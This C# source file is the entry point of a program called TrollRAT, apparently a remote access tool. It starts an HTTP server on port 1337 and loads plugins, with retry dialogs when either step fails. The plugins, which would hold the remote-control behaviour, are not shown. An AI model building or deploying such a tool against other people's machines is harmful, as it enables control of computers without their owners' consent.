using System;

using TrollRAT.Server;
using TrollRAT.Plugins;
using System.Net;
using System.Windows.Forms;

namespace TrollRAT
{
    public static class TrollRAT
    {
        private static WebServer server;
        public static WebServer Server => server;

        internal static PluginManager pluginManager;

        [STAThread]
        static void Main()
        {
            server = new WebServer(1337);

            loadPlugins:
            try
            {
                pluginManager = new PluginManager();
                pluginManager.loadPlugins();
            }
            catch (Exception ex)
            {
                if (MessageBox.Show("Failed to load plugins: \n\n" + ex.Message, "TrollRAT Error",
                    MessageBoxButtons.RetryCancel, MessageBoxIcon.Error) == DialogResult.Retry)
                    goto loadPlugins;
                else
                    Environment.Exit(1);
            }

            runServer:
            try
            {
                server.run();
            }
            catch (HttpListenerException ex)
            {
                if (MessageBox.Show("Failed to run server (maybe TrollRAT is already running?): \n\n" + ex.Message, "TrollRAT Error",
                    MessageBoxButtons.RetryCancel, MessageBoxIcon.Error) == DialogResult.Retry)
                    goto runServer;
                else
                    Environment.Exit(1);
            }
        }
    }
}
